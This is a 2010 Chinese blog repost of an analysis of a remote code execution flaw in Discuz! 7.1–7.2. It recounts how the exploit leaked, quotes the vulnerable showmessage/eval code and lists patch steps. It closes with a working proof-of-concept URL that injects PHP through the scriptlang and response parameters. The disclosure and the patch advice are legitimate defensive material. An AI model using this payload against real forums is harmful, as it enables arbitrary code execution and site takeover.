---
title: Discuz! 7.1-7.2 远程代码执行漏洞及补丁
description: 今天在XX群听说，/tags/Discuz!">Discuz!又爆了大漏洞——post/Discuz!-7.1-7.2-yuancheng-daima-zhixing-loudong.html">Discuz!7.1-7.2远程代码执行漏洞，很多/tags/Discuz!">DZ论坛都惨遭黑手，下面从网上转来一篇文章给大家看看，作者为oldjun。首先说一下，漏洞是t00ls核心群传出去的，xhming先去读的，然后我后来读的，读出来的都是代码执行，1月5日夜里11点多钟，在核心群的黑客们的要求下，xhming给了个poc，我给了个exp，确实发现的是同一个问题。截止夜里2点多种我下线，还只有t00ls核心群里几个人知道我给出的exp，可我怎么也想不到，经过半天时间，exp就满天飞了，而且确实出自昨天我的那个版本。
date: 2010-01-07 11:26:37
category: 漏洞信息
tags: ['Discuz!', '补丁', '漏洞信息', 'PoC']
post_id: 1044
alias: Discuz!-7.1-7.2-yuancheng-daima-zhixing-loudong
ViewNums: 3445
---

今天在XX群听说，[Discuz!](/tags/Discuz!)又爆了大漏洞——[**Discuz! 7.1-7.2 远程代码执行漏洞**](/blog/discuz%21-71-72-yuancheng-daima-zhixing-loudong)，很多[DZ论坛](/tags/Discuz!)都惨遭黑手，下面从网上转来一篇文章给大家看看，作者为[oldjun](http://www.oldjun.com)。

首先说一下，漏洞是t00ls核心群传出去的，xhming 先去读的，然后我后来读的，读出来的都是代码执行，1月5日夜里11点多钟，在核心群的黑客们的要求下，xhming给了个poc，我给了个exp，确实发现的是同一个问题。截止夜里2点多种我下线，还只有t00ls核心群里几个人知道我给出的exp，可我怎么也想不到，经过半天时间，exp就满天飞了， 而且确实出自昨天我的那个版本。

不难想象，exp流传的速度，A与B关系好，A发给B；B与C是好朋友，B发给C...总有人耐不住性子，泄露点风声，于是就人手一份。最受不了的是，竟然有些SB在群里拿来叫卖；实在不想说什么，要叫卖什么时候轮到你？人心不古，以后有的话还是自己藏着吧。

上午漏洞告诉了Saiy，[DZ](/tags/Discuz!)官方的补丁很快就出来了吧。

特别说明：产生漏洞的$scriptlang数组在安装插件后已经初始化，因此有安装插件的用户不受影响。

[Discuz! 7.1-7.2 远程代码执行漏洞](/blog/discuz%21-71-72-yuancheng-daima-zhixing-loudong)介绍：

[Discuz！新版本7.1与7.2版本](/blog/discuz%21-71-72-yuancheng-daima-zhixing-loudong)中的[showmessage函数](/blog/discuz%21-71-72-yuancheng-daima-zhixing-loudong)中eval中执行的参数未初始化，可以任意提交，从而可以执行任意PHP命令。

漏洞分析：

下面来分析下这个[远程代码执行漏洞](/blog/discuz%21-71-72-yuancheng-daima-zhixing-loudong)，这个问题真的很严重，可以直接写shell的：

**一、漏洞来自showmessage函数：**

function showmessage($message, $url_forward = '', $extra = '', $forwardtype = 0) {
extract($GLOBALS, EXTR_SKIP);//危险的用法，未初始化的变量可以直接带进函数，直接导致了问题产生
global $hookscriptmessage, $extrahead, $discuz_uid, $discuz_action, $debuginfo, $seccode, $seccodestatus, $fid, $tid, $charset, $show_message, $inajax, $_DCACHE, $advlist;
define('CACHE_FORBIDDEN', TRUE);
$hookscriptmessage = $show_message = $message;$messagehandle = 0;
$msgforward = unserialize($_DCACHE['settings']['msgforward']);
$refreshtime = intval($msgforward['refreshtime']);
$refreshtime = empty($forwardtype) ? $refreshtime : ($refreshtime ? $refreshtime : 3);
$msgforward['refreshtime'] = $refreshtime * 1000;
$url_forward = empty($url_forward) ? '' : (empty($_DCOOKIE['sid']) && $transsidstatus ? transsid($url_forward) : $url_forward);
$seccodecheck = $seccodestatus & 2;
if($_DCACHE['settings']['funcsiteid'] && $_DCACHE['settings']['funckey'] && $funcstatinfo && !IS_ROBOT) {
$statlogfile = DISCUZ_ROOT.'./forumdata/funcstat.log';
if($fp = @fopen($statlogfile, 'a')) {
@flock($fp, 2);
if(is_array($funcstatinfo)) {
$funcstatinfo = array_unique($funcstatinfo);
foreach($funcstatinfo as $funcinfo) {
fwrite($fp, funcstat_query($funcinfo, $message)."
");
}
} else {
fwrite($fp, funcstat_query($funcstatinfo, $message)."
");
}
fclose($fp);
$funcstatinfo = $GLOBALS['funcstatinfo'] = '';
}
}

if(!defined('STAT_DISABLED') && STAT_ID > 0 && !IS_ROBOT) {
write_statlog($message);
}

if($url_forward && (!empty($quickforward) || empty($inajax) && $msgforward['quick'] && $msgforward['messages'] && @in_array($message, $msgforward['messages']))) {
updatesession();
dheader("location: ".str_replace('&amp;', '&', $url_forward));
}
if(!empty($infloat)) {
if($extra) {
$messagehandle = $extra;
}
$extra = '';
}
if(in_array($extra, array('HALTED', 'NOPERM'))) {
$discuz_action = 254;
} else {
$discuz_action = 255;
}

include language('messages');

$vars = explode(':', $message);//只要含:就可以了
if(count($vars) == 2 && isset($scriptlang[$vars[0]][$vars[1]])) {//两个数字即可，用:分割
eval("$show_message = "".str_replace('"', ' "', $scriptlang[$vars[0]][$vars[1]])."";");//$scriptlang未初始化，可以自定义
} elseif(isset($language[$message])) {
$pre = $inajax ? 'ajax_' : '';
eval("$show_message = "".(isset($language[$pre.$message]) ? $language[$pre.$message] : $language[$message])."";");
unset($pre);
}

......
}

**二、DZ的全局机制导致了未初始化的参数可以任意提交：**

foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
foreach($$_request as $_key => $_value) {
$_key{0} != '_' && $$_key = daddslashes($_value);
}
}

**三、misc.php正好有个可以自定义message的点，其实也是未初始化：**

elseif($action == 'imme_binding' && $discuz_uid) {

if(isemail($id)) {
$msn = $db->result_first("SELECT msn FROM {$tablepre}memberfields WHERE uid='$discuz_uid'");
$msn = explode(" ", $msn);
$id = dhtmlspecialchars(substr($id, 0, strpos($id, '@')));
$msn = "$msn[0] $id";
$db->query("UPDATE {$tablepre}memberfields SET msn='$msn' WHERE uid='$discuz_uid'");
showmessage('msn_binding_succeed', 'memcp.php');
} else {
if($result == 'Declined') {
dheader("Location: memcp.php");
} else {
showmessage($response['result']);//$response没有初始化，可以自定义

}
}

}

**四、漏洞利用：**

showmessage函数里$vars = explode(':', $message);然后message可以自己控制，于是就很容易了，参数是两个自定义的数组。

**五、漏洞修复：**

1.有补丁的打补丁；
2.没有补丁可以暂时先注释引起漏洞的语句，或者对两个变量赋个值。
3.夜火补充：群里朋友提示，DZ后台可以直接打补丁了，未验证。

poc：

（应Saiy的要求，不发exp了！）注册一个用户登陆,然后提交
misc.php?action=imme_binding&response[result]=1:2&scriptlang[1][2]={${phpinfo()}}

